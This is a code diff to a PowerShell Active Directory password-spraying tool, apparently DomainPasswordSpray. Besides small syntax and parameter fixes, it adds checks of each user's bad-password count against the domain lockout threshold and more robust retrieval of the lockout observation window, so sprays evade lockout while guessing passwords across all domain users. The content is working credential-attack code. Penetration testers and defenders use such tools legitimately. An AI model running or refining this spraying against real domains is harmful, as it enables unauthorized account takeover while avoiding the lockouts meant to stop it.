@@ -258,7 +258,7 @@ function Countdown-Timer
     )
     if ($quiet)
     {
-        Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
+        Write-Host "$Message`- Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"
         Start-Sleep -Seconds $Seconds
     } else {
         foreach ($Count in (1..$Seconds))
@@ -497,6 +497,8 @@ function Get-DomainUserList
     return $UserListArray
 }
 
+
+
 function Invoke-SpraySinglePassword
 {
     param(
@@ -520,7 +522,7 @@ function Invoke-SpraySinglePassword
             [Parameter(Position=7)]
             [switch]
             $UsernameAsPassword,
-            [Parameter(Position=7)]
+            [Parameter(Position=8)]
             [switch]
             $Quiet
     )
@@ -528,14 +530,26 @@ function Invoke-SpraySinglePassword
     $count = $UserListArray.count
     Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
-    if ($OutFile -ne ""-and -not $Quiet)
+    if ($OutFile -ne "" -and -not $Quiet)
     {
         Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
     }
     $RandNo = New-Object System.Random
 
+    # Get domain password policy
+    $domainPolicy = Get-ADDefaultDomainPasswordPolicy
+    $lockoutThreshold = $domainPolicy.LockoutThreshold
+
     foreach ($User in $UserListArray)
     {
+        # Check BadPwdCount
+        $badPwdCount = (Get-ADUser -Identity $User -Properties BadPwdCount).BadPwdCount
+        if ($badPwdCount -ge $lockoutThreshold)
+        {
+            Write-Host -ForegroundColor Red "[*] Skipping user $User due to $badPwdCount bad password attempts (threshold: $lockoutThreshold)."
+            continue
+        }
+
         if ($UsernameAsPassword)
         {
             $Password = $User
@@ -559,14 +573,61 @@ function Invoke-SpraySinglePassword
             Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         }
     }
-
 }
 
-function Get-ObservationWindow($DomainEntry)
+
+function Get-ObservationWindow($DomainEntry = $null)
 {
-    # Get account lockout observation window to avoid running more than 1
-    # password spray per observation window.
+    $domain = $null
+
+    if ($null -eq $DomainEntry -or $null -eq $DomainEntry.Properties -or -not $DomainEntry.Properties.Contains('lockoutObservationWindow')) {
+        Write-Verbose "DomainEntry not provided or invalid. Attempting to retrieve domain information."
+        try {
+            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $domainDN = $domain.GetDirectoryEntry().distinguishedName
+            $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$domainDN")
+            $searcher.Filter = "(objectClass=domain)"
+            $DomainEntry = $searcher.FindOne()
+        }
+        catch {
+            Write-Error "Failed to retrieve domain information: $_"
+            throw
+        }
+    }
+
+    if ($null -eq $DomainEntry -or $null -eq $DomainEntry.Properties) {
+        throw "Unable to retrieve valid domain information"
+    }
+
+    if (-not $DomainEntry.Properties.Contains('lockoutObservationWindow')) {
+        throw "lockoutObservationWindow attribute is not present in the domain properties"
+    }
+
     $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
-    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
-    return $observation_window
+    
+    if ($null -eq $lockObservationWindow_attr -or $lockObservationWindow_attr.Count -eq 0) {
+        throw "lockoutObservationWindow attribute is empty"
+    }
+
+    if ($null -eq $lockObservationWindow_attr[0]) {
+        throw "lockoutObservationWindow attribute value is null"
+    }
+
+    try {
+        # Convert the value to Int64
+        $int64Value = [Int64]$lockObservationWindow_attr[0]
+        
+        # Convert to minutes (negative value, hence the minus sign)
+        $observation_window = -($int64Value / 600000000)
+        
+        if ($observation_window -le 0) {
+            throw "Calculated observation window is less than or equal to 0"
+        }
+
+        return $observation_window
+    }
+    catch {
+        Write-Error "Error converting lockoutObservationWindow: $_"
+        throw
+    }
 }
